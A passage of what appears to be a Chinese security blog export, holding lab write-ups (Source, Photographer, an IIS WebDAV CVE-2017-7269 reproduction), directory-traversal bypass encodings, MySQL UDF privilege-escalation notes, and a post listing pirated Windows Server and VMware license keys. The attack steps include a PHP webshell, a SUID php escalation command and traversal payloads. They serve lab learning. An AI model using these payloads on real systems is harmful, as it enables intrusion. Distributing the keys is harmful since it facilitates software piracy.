src="https://img.xpctf.cn/img/20200812092140.png"></p><p>经过了很多尝试，最后还是失败告终，MySQL报错，后来搜索文章发现还是我的环境问题，靶机开发的应该是3306端口，我这里是33060这是为何。</p><p><strong>重新折腾一下环境，根据大佬的文章，之间进靶机修改网卡，之后遇到类似问题也好解决。</strong><br>参考文章：<a href="https://blog.csdn.net/asstart/article/details/103433065">https://blog.csdn.net/asstart/article/details/103433065</a></p><h2 id="环境重部署"><a href="#环境重部署" class="headerlink" title="环境重部署"></a>环境重部署</h2><p>重新导入到VMware，通过拯救模式进行修改密码等操作来完成网卡配置。<br>开机狂按Shift键，结果出来的却是：<br><img src="https://img.xpctf.cn/img/20200812101654.png"></p><p>后来奇迹般的进入了拯救模式，可能是我重启次数过多，造成得自动进入，如果按Shift进入不了，开机一直按ctrl+ait+ins，让他不断重启自动进入。后来经过尝试发现了新方法，按下ctrl+ait+ins画面变化是按下Shift。</p><p><img src="https://img.xpctf.cn/img/20200812102455.png"><br>然后把ro后面(包括ro)删掉，改成rw signie init&#x3D;&#x2F;bin&#x2F;bash，编辑好后直接按下Ctrl+x就能进入出现界面。<br><img src="https://img.xpctf.cn/img/20200812102608.png"></p><p>然后，嘿嘿嘿~ cat &#x2F;root&#x2F;root.txt我们还是遵守游戏规则，一步一步来。<br>好家伙，interfacers去哪里了，没有那我自己写一个。我发现输入”&#x2F;“进去的是”-“，最后尝试发现按Shift+7 &amp;是”&#x2F;“，如果你知道这是为什么请评论告诉我。<br><img src="https://img.xpctf.cn/img/20200812104455.png"></p><p>然后我自己写了一个，最后保存输入”:”时又出问题，按”shift+.”<br><img src="https://img.xpctf.cn/img/20200812105759.png"></p><p>然后重启，使用kali扫描，但还是没有，日了狗了啊。<br><img src="https://img.xpctf.cn/img/20200812110212.png"></p><h2 id="我傻了"><a href="#我傻了" class="headerlink" title="我傻了"></a>我傻了</h2><p>最后我看桌面的“FunBox.ova”文件怎么那么亮闪闪？这个靶机不是叫midnight？淦<br>这是FunBox靶机，但下载好后我回去看描述，把描述看成midnight的了(小声逼逼：能不能图片别那么像？)<br><img src="https://img.xpctf.cn/img/20200812110829.png"></p><p>悲伤逆流成河，这是个悲伤的故事，这篇文章之所以没删除是因为写都写了，就用来纪念我没长眼睛吧！我会在后面的文章更新midnight和FunBox的文章，在我这里，就没有迈不出去的坎。</p><p>我们遇到什么困难，也不要怕，微笑着面对它，消除恐惧的最好办法就是面对恐惧，坚持，才是胜利！加油，奥利给！</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种激活序列号</title>
      <link href="/posts/873b/"/>
      <url>/posts/873b/</url>
      
        <content type="html"><![CDATA[<blockquote><p>自己在找激活码的时候找的特别痛苦，现在写个笔记比较避免下次使用重找。</p></blockquote><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p>cn_win_srv_2003_r2_enterprise_x64_with_sp2_vl_cd1：RYCR6-T7Y6M-2TVHK-C2YW3-7TYQ8</p><p>cn_win_srv_2003_r2_enterprise_with_sp2_vl_cd1：DGT8M-XVFW2-BDMQB-7YDX3-M374W</p><h2 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h2><p>VMware16激活密钥：ZF3R0-FHED2-M80TY-8QYGC-NPKYF</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序列号 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webdav 2017-7269漏洞复现</title>
      <link href="/posts/65e3/"/>
      <url>/posts/65e3/</url>
      
        <content type="html"><![CDATA[<p><strong>Webdav漏洞已经是2017年的老漏洞了，但有些坑我还是踩了，所以写一篇文章吧！</strong></p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p><strong>攻击机：</strong><br>Distributor ID:Kali<br>Description:Kali GNU&#x2F;Linux Rolling<br>Release:2020.2<br>Codename:kali-rolling<br>IP:10.0.0.128</p><p><strong>靶机：</strong></p><p>Computer        : ADMIN-9AB4DA91C<br>OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).<br>Architecture    : x86<br>System Language : zh_CN<br>Domain          : WORKGROUP<br>Logged On Users : 3<br>Meterpreter     : x86&#x2F;windows</p><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>靶机版本必须是R2的版本，我就因为版本不符合折腾了半天；然后装了X64的R2版本，一直缺少dll文件，后来改用X86的版本才复现成功！<br>安装好IIS在”Web服务扩展”里开启”WebDAV”即可<br><img src="https://img.xpctf.cn/img/20200809202613.png"></p><h2 id="攻击脚本"><a href="#攻击脚本" class="headerlink" title="攻击脚本"></a>攻击脚本</h2><p>CVE_2017_7269：<a href="https://github.com/zcgonvh/cve-2017-7269">https://github.com/zcgonvh/cve-2017-7269</a></p><p>下载好攻击脚本后放到kali的<code>/usr/share/metasploit-framework/modules/exploits/windows/iis</code>目录下。<br>打开msfconsole会自动加载，如果没有加载起来输入reload_all手动加载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# mv cve-2017-7269.rb /usr/share/metasploit-framework/modules/exploits/windows/iis/cev_2017_7269.rb</span><br><span class="line">root@kali:~/桌面# msfconsole</span><br><span class="line">msf5 &gt; reload_all</span><br><span class="line">[*] Reloading modules from all module paths...</span><br><span class="line"></span><br><span class="line">msf5 &gt; search 7269</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                                 Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                                 ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow</span><br><span class="line">   1  exploit/windows/iis/cev_2017_7269                    2017-03-31       good    No     CVE-2017-7269 Microsoft IIS WebDav ScStoragePathFromUrl Overflow</span><br><span class="line">msf5 &gt; </span><br></pre></td></tr></table></figure><p><strong>注意：这里有个坑，就是得把”-“改成”_“,否则加载不起来,会爆出如下错误：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] The following modules could not be loaded!..|</span><br><span class="line">[!] /usr/share/metasploit-framework/modules/exploits/windows/iis/cve-2017-7269.rb</span><br><span class="line">[!] Please see /root/.msf4/logs/framework.log for details.</span><br></pre></td></tr></table></figure><h2 id="参数配置"><a href="#参数配置" class="headerlink" title="参数配置"></a>参数配置</h2><p>需要设置得选项有RHOSTS，HttpHost;如果你的端口不是80修改RPORT即可。<br><img src="https://img.xpctf.cn/img/20200809204859.png"></p><h2 id="实验总计"><a href="#实验总计" class="headerlink" title="实验总计"></a>实验总计</h2><p>这个漏洞其实没必要复现的，但在最近的一次小比赛就因为下划线让我丢了很多分，我很气。<br>写文章就为了让自己长个下划线的记心，下次不再踩坑；这次复现浪费我很长时间，都在环境搭建。<br>同时也是为了后人别踩坑，虽然我的博客没啥人；相信吧，快乐的日子将会来临！</p><h2 id="实验补充"><a href="#实验补充" class="headerlink" title="实验补充"></a>实验补充</h2><p>当时比赛是要自己导入7269模块，本地的iis_webdav_scstoragepathfromurl是被破坏的；所以我想试试。<br><img src="https://img.xpctf.cn/img/20200809210157.png"><br>第一次尝试失败了，可能是上次攻击造成的环境差异，重启靶机再试一次！</p><p><img src="https://img.xpctf.cn/img/20200809211213.png"><br>最后进行各种尝试还是没有成功，但我找到一篇文章；总结了失败原因<br>CVE-2017-7269 IIS6_WebDAV远程代码执行的正确打开方式：<a href="https://anquan.baidu.com/article/391">https://anquan.baidu.com/article/391</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webdav </tag>
            
            <tag> 2017-7269 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Source writeup</title>
      <link href="/posts/4a31/"/>
      <url>/posts/4a31/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>找到IP后直接上<code>nmap -A -p- -T 4 192.168.1.134</code><br><img src="https://img.xpctf.cn/img/20200809110030.png"></p><p>发现一个22，10000端口开放；10000端口是http协议，打开看看是什么东西。<br><img src="https://img.xpctf.cn/img/20200809110957.png"></p><p>提示我们需要使用https协议访问 <a href="https://source:10000/">https://source:10000/</a><br>编辑本地hosts来实现域名访问，Windows需要去掉只读属性<br>Windows：D:\Program Files\cmder\vendor\git-for-windows\etc<br>Linux：&#x2F;etc&#x2F;hosts</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>打开<a href="https://source:10000/">https://source:10000/</a> 发现是webmin，Google搜索webmin是什么<br><img src="https://img.xpctf.cn/img/20200809111712.png"><br>总计下来就是一句话，以web的方式管理服务器。10000是webmin的特定端口<br>msfconsole中搜索webmin，发现webmin的一个后门：exploit&#x2F;linux&#x2F;http&#x2F;webmin_backdoor<br><img src="https://img.xpctf.cn/img/20200809115943.png"><br>使用use exploit&#x2F;linux&#x2F;http&#x2F;webmin_backdoor模块<br>show options查看需要配置的选项，如下图配置<br><img src="https://img.xpctf.cn/img/20200809120158.png"><br><strong>注意：因为使用https协议，所以需要设置SSL为true，默认为flase且Required为no</strong></p><h2 id="获得标志"><a href="#获得标志" class="headerlink" title="获得标志"></a>获得标志</h2><p>用户标志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name user.txt</span><br><span class="line">/home/dark/user.txt</span><br><span class="line">cat /home/dark/user.txt</span><br><span class="line">THM&#123;SUPPLY_CHAIN_COMPROMISE&#125;</span><br></pre></td></tr></table></figure><p>Root标志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name root.txt</span><br><span class="line">/root/root.txt</span><br><span class="line">cat /root/root.txt</span><br><span class="line">THM&#123;UPDATE_YOUR_INSTALL&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Source </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Photographer writeup</title>
      <link href="/posts/cec4/"/>
      <url>/posts/cec4/</url>
      
        <content type="html"><![CDATA[<p>提示：This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.</p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p><strong>靶机</strong><br>IP：未知<br>MAC：00:0C:29:A4:BA:BA<br><strong>kali</strong><br>IP：192.168.1.131<br>MAC：00:0C:29:E2:0D:83</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>VMware打开时仅主机模式，把kali设置成仅主机后重新请求DHCP(命令：dhclient)。获取到IP后使用nmap扫描当前网段，根据MAC获取靶机IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# nmap -sP 192.168.1.1/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 11:02 CST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.133</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">MAC Address: 00:0C:29:A4:BA:BA (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.254</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 00:50:56:E9:4B:54 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.131</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 28.07 seconds</span><br></pre></td></tr></table></figure><p>根据nmap返回信息确定靶机IP为192.168.1.133，对靶机进行进一步扫描，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# nmap -T 4 -sV -p- 192.168.1.133</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 11:07 CST</span><br><span class="line">Nmap scan report for 192.168.1.133</span><br><span class="line">Host is up (0.00099s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">8000/tcp open  ssl/http-alt?</span><br><span class="line">MAC Address: 00:0C:29:A4:BA:BA (VMware)</span><br><span class="line">Service Info: Host: PHOTOGRAPHER</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 75.52 seconds</span><br></pre></td></tr></table></figure><p>靶机开放了80，139，445，8000端口。先从80下手吧，浏览器打开看看是什么。</p><p>看了一圈加上目录扫描也没什么东西，暂时放弃，看看8000端口。也是一个网页，是什么暂时不知道，dirseach扫描试试<code>python3 dirsearch.py -u http://192.168.1.133:8000/ -e php -t 20 -x 302,404,301,403</code>，200响应代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[15:45:28] Starting: </span><br><span class="line">[15:45:34] 200 - 1020B  - /admin/                                    </span><br><span class="line">[15:45:34] 200 - 1020B  - /admin/?/login         </span><br><span class="line">[15:45:34] 200 - 1020B  - /admin/index.html                                                  </span><br><span class="line">[15:45:36] 200 -  114B  - /app/logs/                                  </span><br><span class="line">[15:45:40] 200 -    3KB - /error/                                            </span><br><span class="line">[15:45:42] 200 -    5KB - /index.php                                                                         </span><br><span class="line">[15:45:45] 200 -    3KB - /pages/admin/</span><br></pre></td></tr></table></figure><p>访问admin看到网站后台，随便输入看到是提交到api.php去，但是响应代码是404，试试其他的吧。</p><p>使用enum4linux扫描445端口收集信息，发现了&#x2F;&#x2F;172.19.4.11&#x2F;sambashare共享目录。<br>（enum4linux软件kali不自带，如果没有请使用apt安装，ip是因为我修改了网卡变得）<br><img src="https://img.xpctf.cn/img/20200808161410.png"><br>使用smbclient客户端软件连接到smb共享目录，登录后发现两个文件，使用get下载到本地查看，其中一个目录文件如下：<br><img src="https://img.xpctf.cn/img/20200808161940.png"><br>是一封邮件，通过收件人确定后台用户邮箱，注意最后一句，Don’t forget your secret, my babygirl ;)，猜测密码是babygirl。使用邮箱账号和我的秘密尝试登陆8000端口网站后台，成功了！<br>找了半天没找到关于之类的说明，然后瞎点了一下头像弹出<img src="https://img.xpctf.cn/img/20200808162726.png">，点击版本号进入打开了 Koken的官网，目测应该是博客框架，版本是2013年的老版本，0.22.24。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>google搜索koken 0.22.24 <a href="https://www.exploit-db.com/">https://www.exploit-db.com</a><br>发现任意文件上传漏洞，首先得学会如何看exploit-db的漏洞利用说明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Steps to exploit:</span><br><span class="line"></span><br><span class="line">1. Create a malicious PHP file with this content:</span><br><span class="line">1.创建一个包含以下内容的恶意PHP文件：</span><br><span class="line"></span><br><span class="line">   &lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">2. Save as &quot;image.php.jpg&quot;</span><br><span class="line">2.另存为“ image.php.jpg”</span><br><span class="line"></span><br><span class="line">3. Authenticated, go to Koken CMS Dashboard, upload your file on &quot;Import Content&quot; button (Library panel) and send the HTTP request to Burp.</span><br><span class="line">3. 通过身份验证后，转到Koken CMS仪表板，在“导入内容”按钮（“库”面板）上上传文件，然后将HTTP请求发送到Burp。</span><br><span class="line"></span><br><span class="line">4. On Burp, rename your file to &quot;image.php&quot;</span><br><span class="line">4.在Burp上，将文件重命名为“ image.php”</span><br><span class="line"></span><br><span class="line">5. On Koken CMS Library, select you file and put the mouse on &quot;Download File&quot; to see where your file is hosted on server.</span><br><span class="line">5.在Koken CMS库上，选择您的文件，然后将鼠标放在“下载文件”上，以查看文件在服务器上的托管位置。</span><br></pre></td></tr></table></figure><p>说白了就是告诉你漏洞在哪里，怎么利用，找到上传点和绕过方式上传shell脚本就好了。<br>找了半天也没找到“Import Content”按钮，后来通过Ctrl+f5找到了该按钮(我以为在菜单栏呢)。<br><img src="https://img.xpctf.cn/img/20200808164953.png"></p><p>写一个一句话保存成123.jpg(随意)，打开burp设置代理后到页面上传，拦截后把jpg后缀改成php<br><img src="https://img.xpctf.cn/img/20200808165450.png"></p><p>上传完shell打开网站巨慢，不知道为什么。</p><p>上传了很多遍后缀都是jpg，后来是我改错位置了(基础不牢)，仔细看了exploit-db的利用说明发现自己的问题。</p><p><img src="https://img.xpctf.cn/img/20200808172341.png"></p><p>上传完右边有个连接，复制打开<br><img src="https://img.xpctf.cn/img/20200808172910.png"></p><p>点击“Download File”提取直链，添加到蚂🗡中，右键虚拟终端<br><img src="https://img.xpctf.cn/img/20200808173202.png"></p><p>使用finde搜索：find &#x2F; -name user.txt 2&gt;&#x2F;dev&#x2F;null</p><p>发现在&#x2F;home&#x2F;daisa&#x2F;user.txt下，使用cat成功获得第一个flag：d41d8cd98f00b204e9800998ecf8427e<br><img src="https://img.xpctf.cn/img/20200808173936.png"><br>继续使用相同的方法搜索proof.txt,结果返回为空。先吃饭继续提权</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>命令查找www用户有sudo权限的命令用于提权，最终先择php7.2命令<br><img src="https://img.xpctf.cn/img/20200808194045.png"><br>在终端中输入<code>/usr/bin/php7.2 -r &quot;pcntl_exec(&#39;/bin/bash&#39;, [&#39;-p&#39;]);&quot;</code>进行权限提升，通过whoami发现没有提权成功。<br><img src="https://img.xpctf.cn/img/20200808194138.png"><br>使用msfvenom生成反弹shell，上传到服务器成功反弹shell，使用php7.2提权成功。获得proof.txt。<br><img src="https://img.xpctf.cn/img/20200808194419.png"></p><h2 id="实验总计"><a href="#实验总计" class="headerlink" title="实验总计"></a>实验总计</h2><p>这是我第一次尝试综合靶机，但是难度不算大，我预期的结果是获得完美的root权限的，但是终究力不从心。<br>还得学习！！！</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Photographer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进制转换</title>
      <link href="/posts/915b/"/>
      <url>/posts/915b/</url>
      
        <content type="html"><![CDATA[<h2 id="表示方法"><a href="#表示方法" class="headerlink" title="表示方法"></a>表示方法</h2><p>二进制：0b开头<br>八进制：0o开头<br>十进制：无前缀<br>十六进制：0x开头</p><h2 id="十进制转"><a href="#十进制转" class="headerlink" title="十进制转"></a>十进制转</h2><p>十进制转二进制：bin(3)  &#x3D;&gt;  ‘0b11’<br>十进制转八进制：oct(9)  &#x3D;&gt;  ‘0o11’<br>十进制转十六进制：hex(11)  &#x3D;&gt;  ‘0xb’</p><h2 id="转十进制"><a href="#转十进制" class="headerlink" title="转十进制"></a>转十进制</h2><p>二进制转十进制：0b11  &#x3D;&gt;  3<br>八进制转十进制：0o11  &#x3D;&gt;  9<br>十六进制转十进制：0xb  &#x3D;&gt; 11</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进制转换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>目录穿越漏洞复现</title>
      <link href="/posts/687/"/>
      <url>/posts/687/</url>
      
        <content type="html"><![CDATA[<h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>目录穿越（Directory Traversal)攻击是黑客能够在Web应用程序所在的根目录以外的文件夹上，任意的存取被限制的文件夹，执行命令或查找数据。目录穿越攻击，也与人称为Path Traversal攻击。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者可以使用目录穿越攻击来查找，执行或存取Web应用程序所在的根目录以外的文件夹。如果目录穿越攻击成功，黑客就可以执行破坏性的命令来攻击网站。</p><h2 id="简单的目录穿越"><a href="#简单的目录穿越" class="headerlink" title="简单的目录穿越"></a>简单的目录穿越</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;<span class="comment">//判断我们传入的变量是否可控</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="string">&quot;file/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);<span class="comment">//读取我们file文件夹下的文件并输出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.xpctf.cn/img/20200724101317.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>源码中接收一个file参数，然后拼接到file后读取内容并输出，理论上只能读取file文件夹下的文件，当前我们加上..&#x2F;就能范围file文件夹的上级目录，..&#x2F;能叠加，直到返回到根目录。<br>我们在C盘根目录创建hello.txt文件，使用目录穿越来读取里面的内容，这样就能读取非web跟目录的文件。<br>payload：<code>http://172.19.4.7/ds/readfile.php?file=../../../../../hello.txt</code><br><img src="https://img.xpctf.cn/img/20200724101449.png"><br><img src="https://img.xpctf.cn/img/20200724101558.png"></p><h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><ul><li><p>进行URL编码</p></li><li><p>点&#x3D;&gt;%2e 反斜杠&#x3D;&gt;%2f 正斜杠&#x3D;&gt;%5c</p></li><li><p>进行16位Unicode编码</p></li><li><p>点&#x3D;&gt;%u002e 反斜杠&#x3D;&gt;%u2215 正斜杠&#x3D;&gt;%u2216</p></li><li><p>进行两次URL编码</p></li><li><p>点&#x3D;&gt;%252e 反斜杠&#x3D;&gt;%u252f 正斜杠&#x3D;&gt;%u255c</p></li><li><p>进行超长UTF-8 Unicode编码</p></li><li><p>点&#x3D;&gt;%c0%2e %e0$40%ae %c0ae</p></li><li><p>反斜杠&#x3D;&gt;%c0af %e0%80af %c0%af</p></li><li><p>正斜杠&#x3D;&gt;%c0%5c %c0%80%5c</p></li></ul><h2 id="加固方案"><a href="#加固方案" class="headerlink" title="加固方案"></a>加固方案</h2><p>1：在URL内不要使用文件名称作为参数<br>2：检查使用者输入的文件名是否含有“..”的目录阶层字符。<br>3：在php.ini文件中设置open_basedir来指定文件的目录。<br>4：使用realpath函数来展开文件路径中的”.&#x2F;“ “..&#x2F;“等字符，然后返回绝对路径名称。<br>5：使用basename函数来返回不包含路径的文件名称。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 漏洞学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL数据库提权</title>
      <link href="/posts/2c54/"/>
      <url>/posts/2c54/</url>
      
        <content type="html"><![CDATA[<h2 id="Udf提权"><a href="#Udf提权" class="headerlink" title="Udf提权"></a>Udf提权</h2><p>什么是Udf提权？<br>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。<br>提权顾名思义就是提示权限，但这里的提权是指自己通过特殊手段给自己提权，达到入侵目的。<br>那么Udf提权就是利用mysql的Udf来提升自己的权限，实际是用mysql的功能来进行shell，就像phpshell一样，这里我们可以理解为udfshel。<br>参考文章：<a href="https://www.cnblogs.com/sijidou/p/10522972.html">https://www.cnblogs.com/sijidou/p/10522972.html</a></p><h3 id="检查环境"><a href="#检查环境" class="headerlink" title="检查环境"></a>检查环境</h3><p>使用Udf提权，mysql用户必须具有读取和写入权限，使用命令：<code>select user,insert_priv,delete_priv from mysql.user where user=&#39;root&#39;;</code>查看账户是否具有权限。<br><img src="https://img.xpctf.cn/img/20200722160925.png"><br>因为udf有32位和64位得，所以得确定目标数据库版本(这里是数据库版本，不是操作系统版本)是64位还是32位，使用命令：<code>show variables like &#39;version%&#39;;</code>和<code>select @@version_compile_os,@@version_compile_machine;</code>来查看目标数据库位数，version_compile_os是系统版本(我的系统是64位的2003，数据库说是win32)，version_compile_machine是数据库版本。<br><img src="https://img.xpctf.cn/img/20200722161401.png" alt="Windows"><br><img src="https://img.xpctf.cn/img/20200722161927.png" alt="Linux"></p><h3 id="mysql设置"><a href="#mysql设置" class="headerlink" title="mysql设置"></a>mysql设置</h3><p>secure_file_priv状态决定mysql能不能导入和导出<br>secure_file_priv&#x3D;null 禁止导入导出<br>secure_file_priv&#x3D;’path’ 允许在path目录导入导出<br>secure_file_priv&#x3D;空白 不限制导入导出<br>使用<code>show variables like &#39;sec%&#39;;</code>查看，可以在my.ini修改，不存在secure_file_priv新建即可。修改完成需要重启。</p><h3 id="版本差异"><a href="#版本差异" class="headerlink" title="版本差异"></a>版本差异</h3><p>mysql版本如果是在5.1以下udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。<br>mysql版本如果是在5.1以上udf.dll文件放在mysql目录下的plugin文件夹中，这个变量可以在mysql.ini文件中找到并进行编辑。使用select @@plugin_dir查看plugin文件夹。<br><img src="https://img.xpctf.cn/img/20200722164036.png"></p><h3 id="获得Udf文件"><a href="#获得Udf文件" class="headerlink" title="获得Udf文件"></a>获得Udf文件</h3><p>一共有四种Udf，Windows32位、Windows64位和Linux32位、Linux64位，metasploit的在&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql目录下<br><img src="https://img.xpctf.cn/img/20200722172446.png"><br>sqlmap也有，在sqlmap\data\udf\mysql\目录下，sqlmap下的4个udf文件是经过编码的，如果直接丢在mysql的plugin目录下是无法加载的，需要用sqlmap&#x2F;extra&#x2F;cloak&#x2F;cloak.py进行解码，在sqlmap&#x2F;extra&#x2F;cloak&#x2F;目录下使用以下命令，生成的udf文件就会出现在当前文件夹中<br><code>python .\cloak.py -d -i ..\..\udf\mysql\linux\64\lib_mysqludf_sys.so_ -o linux_udf_64.so</code></p><h3 id="上传Udf文件"><a href="#上传Udf文件" class="headerlink" title="上传Udf文件"></a>上传Udf文件</h3><p><strong>注意：如果没有plugin目录会写入失败，得手动创建plugin目录</strong><br><strong>这部分是Udf提权的核心</strong></p><ul><li><p>load_file函数支持网络路径，如果将DLL复制到网络共享中，则可以直接加载它并写入磁盘。<br><img src="https://img.xpctf.cn/img/20200722191319.png"></p></li><li><p>使用十六进制编码后写入到磁盘<br>使用hex编码并保存<code>select hex(load_file(&#39;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&#39;)) into dumpfile &#39;/tmp/udf.hex&#39;;</code><br>使用<code>select 